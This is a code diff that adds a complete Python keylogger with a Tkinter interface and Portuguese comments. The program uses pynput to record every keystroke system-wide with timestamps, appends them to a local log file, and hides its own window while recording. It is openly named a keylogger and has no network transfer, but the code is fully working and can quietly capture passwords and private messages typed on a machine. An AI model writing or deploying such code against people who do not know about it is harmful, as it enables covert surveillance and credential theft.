@@ -1,0 +1,101 @@
+import tkinter as tk  # Importa a biblioteca tkinter para criar a interface gráfica
+from tkinter import filedialog, messagebox  # Importa funções para abrir diálogos e exibir mensagens
+from pynput import keyboard  # Importa a biblioteca para monitorar teclas pressionadas
+from datetime import datetime  # Importa a classe datetime para manipulação de datas e horários
+
+class KeyloggerApp:
+    def __init__(self, master):
+        self.master = master  # Atribui a janela principal à variável master
+        self.master.title("Keylogger")  # Define o título da janela
+        
+        self.is_logging = False  # Variável para controlar se a gravação está ativa
+        self.log_file = "key_log.txt"  # Nome do arquivo onde os logs serão salvos
+        
+        # Botão para iniciar a gravação
+        self.start_button = tk.Button(master, text="Iniciar Gravação", command=self.start_logging)
+        self.start_button.pack(pady=20)  # Adiciona o botão à janela
+
+        # Botão para parar a gravação
+        self.stop_button = tk.Button(master, text="Parar Gravação", command=self.stop_logging, state=tk.DISABLED)
+        self.stop_button.pack(pady=20)  # Adiciona o botão à janela (desativado inicialmente)
+
+        # Botão para escolher o local do arquivo de log
+        self.choose_file_button = tk.Button(master, text="Escolher Local de Salvar", command=self.choose_log_file)
+        self.choose_file_button.pack(pady=20)  # Adiciona o botão à janela
+
+        # Botão para limpar o log
+        self.clear_log_button = tk.Button(master, text="Limpar Log", command=self.clear_log)
+        self.clear_log_button.pack(pady=20)  # Adiciona o botão à janela
+
+        # Campo de texto para exibir o log em tempo real
+        self.log_text = tk.Text(master, height=10, width=50)
+        self.log_text.pack(pady=20)  # Adiciona o campo de texto à janela
+
+    def log_start_time(self):
+        # Método para registrar o horário de início da gravação
+        with open(self.log_file, "a") as f:  # Abre o arquivo de log em modo de anexação
+            start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")  # Captura o horário atual
+            f.write(f"Registro iniciado em: {start_time}\n")  # Escreve o horário no log
+
+    def on_press(self, key):
+        # Método chamado quando uma tecla é pressionada
+        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")  # Captura o horário atual
+        try:
+            key_str = f'{key.char}'  # Tenta capturar a representação da tecla pressionada
+        except AttributeError:
+            key_str = f' {key} '  # Se a tecla não tiver representação (como teclas de função), captura o tipo
+        
+        log_entry = f'[{timestamp}] {key_str}'  # Formata a entrada do log com timestamp
+        
+        # Salvar no arquivo de log
+        with open(self.log_file, "a") as f:  # Abre o arquivo em modo de anexação
+            f.write(log_entry)  # Escreve a entrada de log no arquivo
+        
+        # Atualizar o campo de texto na interface
+        self.log_text.insert(tk.END, log_entry + '\n')  # Insere a entrada no campo de texto
+        self.log_text.see(tk.END)  # Rola para mostrar a parte mais recente
+
+    def on_release(self, key):
+        # Método chamado quando uma tecla é liberada
+        if key == keyboard.Key.esc:  # Verifica se a tecla "Esc" foi pressionada
+            self.stop_logging()  # Para a gravação se "Esc" foi pressionada
+
+    def start_logging(self):
+        # Método para iniciar a gravação
+        if not self.is_logging:  # Verifica se a gravação não está ativa
+            self.log_start_time()  # Registra o horário de início
+            self.is_logging = True  # Define a gravação como ativa
+            self.start_button.config(state=tk.DISABLED)  # Desabilita o botão de iniciar
+            self.stop_button.config(state=tk.NORMAL)  # Habilita o botão de parar
+            self.master.withdraw()  # Oculta a janela principal
+            self.listener = keyboard.Listener(on_press=self.on_press, on_release=self.on_release)  # Cria um listener de teclado
+            self.listener.start()  # Inicia o listener
+
+    def stop_logging(self):
+        # Método para parar a gravação
+        if self.is_logging:  # Verifica se a gravação está ativa
+            self.listener.stop()  # Para o listener
+            self.is_logging = False  # Define a gravação como inativa
+            self.start_button.config(state=tk.NORMAL)  # Habilita o botão de iniciar
+            self.stop_button.config(state=tk.DISABLED)  # Desabilita o botão de parar
+            self.master.deiconify()  # Mostra a janela principal novamente
+
+    def choose_log_file(self):
+        # Método para escolher o local de salvar o arquivo de log
+        file_path = filedialog.asksaveasfilename(defaultextension=".txt",  # Abre o diálogo para salvar arquivo
+                                                   filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
+        if file_path:  # Verifica se o usuário escolheu um caminho
+            self.log_file = file_path  # Atualiza o caminho do arquivo de log
+            messagebox.showinfo("Info", f"Log será salvo em: {self.log_file}")  # Exibe mensagem de confirmação
+
+    def clear_log(self):
+        # Método para limpar o log
+        self.log_text.delete(1.0, tk.END)  # Limpa o campo de texto
+        with open(self.log_file, "w") as f:  # Abre o arquivo de log em modo de escrita (limpa o conteúdo)
+            f.write("")  # Escreve nada, apenas limpa
+        messagebox.showinfo("Info", "Log limpo com sucesso!")  # Exibe mensagem de confirmação
+
+if __name__ == "__main__":
+    root = tk.Tk()  # Cria a janela principal do Tkinter
+    app = KeyloggerApp(root)  # Instancia a classe KeyloggerApp
+    root.mainloop()  # Inicia o loop de eventos da interface gráfica
